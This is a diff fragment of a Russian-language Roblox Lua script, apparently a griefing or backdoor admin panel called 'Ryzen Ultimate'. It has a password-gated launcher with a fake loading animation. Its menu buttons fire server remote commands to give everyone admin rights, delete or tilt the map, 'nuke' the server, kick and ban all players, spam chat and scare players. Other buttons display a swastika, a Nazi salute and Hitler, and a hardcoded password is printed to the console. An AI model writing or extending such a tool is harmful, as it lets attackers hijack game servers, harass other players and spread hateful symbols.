+    errorText.Text = ""
+    errorText.TextColor3 = Color3.fromRGB(255, 50, 50)
+    errorText.TextScaled = true
+    errorText.Font = Enum.Font.Gotham
+    errorText.Parent = mainFrame
+
+    mainFrame.BackgroundTransparency = 1
+    TweenService:Create(mainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0}):Play()
+
+    local function startLoading(callback)
+        loadFrame.BackgroundTransparency = 0
+        loadText.Text = "🔐 ИНИЦИАЛИЗАЦИЯ..."
+        progressBar.Size = UDim2.new(0, 0, 1, 0)
+
+        local steps = 25
+        local loadMessages = {
+            "🔐 ИНИЦИАЛИЗАЦИЯ...",
+            "📡 ПОДКЛЮЧЕНИЕ К СЕРВЕРУ...",
+            "⚡ ДЕШИФРАЦИЯ ДАННЫХ...",
+            "🛡️ АКТИВАЦИЯ ЗАЩИТЫ...",
+            "🔥 ЗАГРУЗКА МОДУЛЕЙ...",
+            "✅ ГОТОВО!"
+        }
+
+        for i = 1, steps do
+            task.wait(0.04)
+            local progress = i / steps
+            progressBar.Size = UDim2.new(progress, 0, 1, 0)
+            local msgIndex = math.min(math.floor(progress * #loadMessages) + 1, #loadMessages)
+            loadText.Text = loadMessages[msgIndex] or loadText.Text
+            if progress < 0.3 then
+                progressBar.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
+            elseif progress < 0.6 then
+                progressBar.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
+            else
+                progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
+            end
+        end
+
+        loadText.Text = "✅ ГОТОВО К РАБОТЕ!"
+        task.wait(0.3)
+        if callback then callback() end
+    end
+
+    loginButton.MouseButton1Click:Connect(function()
+        local inputPass = passwordBox.Text
+        if inputPass == PASSWORD then
+            errorText.Text = ""
+            loginButton.Text = "⏳ ЗАГРУЗКА..."
+            loginButton.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
+
+            startLoading(function()
+                loginButton.Text = "✅ ДОБРО ПОЖАЛОВАТЬ!"
+                loginButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+                task.wait(0.5)
+                mainFrame:TweenSize(UDim2.new(0, 0, 0, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true)
+                task.wait(0.3)
+                screenGui:Destroy()
+                createMainGUI()
+            end)
+        else
+            errorText.Text = "❌ НЕВЕРНЫЙ ПАРОЛЬ!"
+            passwordBox.Text = ""
+            passwordBox:CaptureFocus()
+            local shake = TweenService:Create(mainFrame, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
+                Position = UDim2.new(0.5, -250 + math.random(-15,15), 0.5, -200)
+            })
+            shake:Play()
+            task.wait(0.08)
+            shake:Cancel()
+            mainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
+        end
+    end)
+
+    passwordBox.FocusLost:Connect(function(enterPressed)
+        if enterPressed then loginButton.MouseButton1Click:Fire() end
+    end)
+end
+
+-- ============================================================
+-- 13. ОСНОВНОЕ МЕНЮ
+-- ============================================================
+
+local function createMainGUI()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "RyzenGUI"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = player.PlayerGui
+
+    local toggleButton = Instance.new("ImageButton")
+    toggleButton.Size = UDim2.new(0, 65, 0, 65)
+    toggleButton.Position = UDim2.new(0, 15, 0, 15)
+    toggleButton.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    toggleButton.Image = "rbxassetid://13108746847"
+    toggleButton.Parent = screenGui
+    Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0, 12)
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 750, 0, 580)
+    mainFrame.Position = UDim2.new(0.5, -375, 0.5, -290)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
+    mainFrame.BackgroundTransparency = 1
+    mainFrame.Parent = screenGui
+    mainFrame.Visible = false
+    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
+
+    local scroll = Instance.new("ScrollingFrame")
+    scroll.Size = UDim2.new(1, -20, 1, -80)
+    scroll.Position = UDim2.new(0, 10, 0, 45)
+    scroll.BackgroundTransparency = 1
+    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+    scroll.ScrollBarThickness = 6
+    scroll.Parent = mainFrame
+
+    local y = 0
+
+    local function addCat(t,c)
+        local l = Instance.new("TextLabel", scroll)
+        l.Size = UDim2.new(0.9, 0, 0, 30)
+        l.Position = UDim2.new(0.05, 0, 0, y)
+        l.BackgroundColor3 = c
+        l.Text = t
+        l.TextColor3 = Color3.fromRGB(255,255,255)
+        l.TextScaled = true
+        l.Font = Enum.Font.GothamBold
+        y = y + 40
+        return y
+    end
+
+    local function addBtn(t,a,d)
+        local b = Instance.new("TextButton", scroll)
+        b.Size = UDim2.new(0.8, 0, 0, 35)
+        b.Position = UDim2.new(0.1, 0, 0, y)
+        b.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+        b.Text = t
+        b.TextColor3 = Color3.fromRGB(200, 200, 255)
+        b.TextScaled = true
+        b.Font = Enum.Font.Gotham
+        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
+        b.MouseButton1Click:Connect(function()
+            if remote then
+                if a == "notify" then
+                    local input = Instance.new("TextBox")
+                    input.Size = UDim2.new(0, 400, 0, 60)
+                    input.Position = UDim2.new(0.5, -200, 0.5, -30)
+                    input.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+                    input.TextColor3 = Color3.fromRGB(255,255,255)
+                    input.TextScaled = true
+                    input.Font = Enum.Font.Gotham
+                    input.PlaceholderText = "Введите текст уведомления..."
+                    input.Parent = screenGui
+                    input.FocusLost:Connect(function(enterPressed)
+                        if enterPressed and input.Text ~= "" then
+                            remote:FireServer("notify", input.Text)
+                            input:Destroy()
+                        else
+                            input:Destroy()
+                        end
+                    end)
+                else
+                    remote:FireServer(a, d or "")
+                end
+            end
+        end)
+        y = y + 42
+        return y
+    end
+
+    -- === ОСНОВНЫЕ ===
+    y = addCat("⚙️ ОСНОВНЫЕ", Color3.fromRGB(0,40,80))
+    for _, v in pairs({
+        {"Зига","zig"},
+        {"Свастика","swastika"},
+        {"Адское небо","hellsky"},
+        {"Кровавое небо","bloodysky"},
+        {"Телепорт","teleport"},
+        {"Танк","tank"},
+        {"Эффекты","effects"},
+        {"Музыка","music"},
+        {"Стоп муз","stopmusic"}
+    }) do y = addBtn(v[1], v[2]) end
+    y = y + 10
+
+    -- === ОРУЖИЕ ===
+    y = addCat("🔫 ОРУЖИЕ", Color3.fromRGB(0,60,40))
+    for _, v in pairs({
+        {"AK-47 (себе)","giveak"},
+        {"AK-47 (всем)","giveakall"},
+        {"Убрать AK-47","removeakall"}
+    }) do y = addBtn(v[1], v[2]) end
+    y = y + 10
+
+    -- === АДМИНКА ===
+    y = addCat("👑 АДМИНКА", Color3.fromRGB(60,40,0))
+    for _, v in pairs({
+        {"Админка (себе)","giveadmin"},
+        {"Админка (ВСЕМ)","giveadminall"}
+    }) do y = addBtn(v[1], v[2]) end
+    y = y + 10
+
+    -- === КАРТА ===
+    y = addCat("🗺️ КАРТА", Color3.fromRGB(0,60,80))
+    for _, v in pairs({
+        {"🗑️ Удалить карту","deletemap"},
+        {"🌋 Создать карту","createmap"},
+        {"🔄 Заменить карту","replacemap"},
+        {"🌋 Адский ландшафт","hellmap"},
+        {"💀 Кладбище","graveyard"},
+        {"📐 Карта 1x1x1x1","onedotmap"},
+        {"🌍 Наклон (X, 15°)","tilt","15"},
+        {"🌍 Наклон (X, 30°)","tilt","30"},
+        {"🌍 Наклон (Z, 15°)","tiltz","15"},
+        {"🌍 Наклон (Z, 30°)","tiltz","30"},
+        {"🔄 Сбросить наклон","resettilt"}
+    }) do y = addBtn(v[1], v[2], v[3]) end
+    y = y + 10
+
+    -- === TROLL ===
+    y = addCat("🧨 TROLL", Color3.fromRGB(100,0,0))
+    for _, v in pairs({
+        {"Танец (обыч)","dance","default"},
+        {"Танец (робот)","dance","robot"},
+        {"Танец (гангнам)","dance","gangnam"},
+        {"Зомби","zombie"},
+        {"Гитлер","hitler"},
+        {"Кровавые текстуры","bloody"},
+        {"Адская погода","hellweather"},
+        {"Рандом-телепорт","randomtp"},
+        {"Кров. монстр","bloodmonster"},
+        {"Чат-спам","chatspam"},
+        {"Скример всем","scareall"},
+        {"Переворот экр","flipscreen"},
+        {"Смена имён","renametroll"},
+        {"Страшные эффекты","scaryeffects"}
+    }) do y = addBtn(v[1], v[2], v[3]) end
+    y = y + 10
+
+    -- === СНОС ===
+    y = addCat("💀 СНОС", Color3.fromRGB(80,0,0))
+    for _, v in pairs({
+        {"💥 Снести СЕРВЕР","nuke"},
+        {"Деньги","giveitems","money"},
+        {"Оружие","giveitems","weapons"},
+        {"Всё","giveitems","all"},
+        {"Режим бога","godmode"},
+        {"Уведомление","notify"},
+        {"Кик всех","kickall"},
+        {"Бан всех","banall"}
+    }) do y = addBtn(v[1], v[2], v[3]) end
+
+    scroll.CanvasSize = UDim2.new(0,0,0,y+30)
+
+    local isOpen = false
+    toggleButton.MouseButton1Click:Connect(function()
+        isOpen = not isOpen
+        if isOpen then
+            mainFrame.Visible = true
+            mainFrame:TweenSize(UDim2.new(0,750,0,580), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 0.3, true)
+            mainFrame:TweenBackgroundTransparency(0, 0.3)
+        else
+            mainFrame:TweenSize(UDim2.new(0,0,0,0), Enum.EasingDirection.In, Enum.EasingStyle.Quad, 0.2, true)
+            mainFrame:TweenBackgroundTransparency(1, 0.2)
+            task.wait(0.25)
+            mainFrame.Visible = false
+        end
+    end)
+
+    createApocalypseMap()
+    globalNotify("🔥 RYZEN ULTIMATE АКТИВИРОВАН! 500+ ИГРОКОВ — ДЕРЖИТЕСЬ!", Color3.fromRGB(0,200,255), 4)
+    print("✅ Ryzen Ultimate v12.1 ACTIVE (500-1000+ players)")
+    print("👹 1x1x1x1 in center")
+    print("🌍 Tilt map available")
+    print("🔒 Пароль: wxi8298")
+end
+
+-- ============================================================
+-- 14. ЗАПУСК
+-- ============================================================
+
+createBeautifulLauncher()
